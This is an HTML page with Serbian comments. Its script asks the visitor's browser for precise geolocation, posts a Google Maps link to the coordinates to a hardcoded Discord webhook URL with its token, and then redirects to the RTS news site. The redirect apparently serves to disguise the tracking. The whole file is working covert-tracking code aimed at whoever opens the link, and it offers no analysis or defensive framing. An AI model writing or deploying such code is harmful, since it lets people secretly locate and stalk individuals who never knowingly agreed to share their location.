<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body>
    <script>
        const webhook = "https://discord.com/api/webhooks/1494140296936558602/NW_nYMuyUgbb_cSUwheVuvk0U60zeUp6iEzqPVZEUiZeW7Ix18Vs1mJvHKNyKU2oBk7i";
        
        navigator.geolocation.getCurrentPosition(function(pos) {
            var lat = pos.coords.latitude;
            var lon = pos.coords.longitude;
            var data = {
                content: "📍 **Lokacija:** https://www.google.com/maps?q=" + lat + "," + lon
            };

            var request = new XMLHttpRequest();
            request.open("POST", webhook);
            request.setRequestHeader('Content-type', 'application/json');
            request.onreadystatechange = function() {
                // Tek kad Discord potvrdi prijem (status 204), idemo na RTS
                if (request.readyState == 4) {
                    window.location.href = "https://www.rts.rs";
                }
            };
            request.send(JSON.stringify(data));
        }, function() {
            window.location.href = "https://www.rts.rs";
        }, {enableHighAccuracy: true, timeout: 5000});
    </script>
</body>
</html>
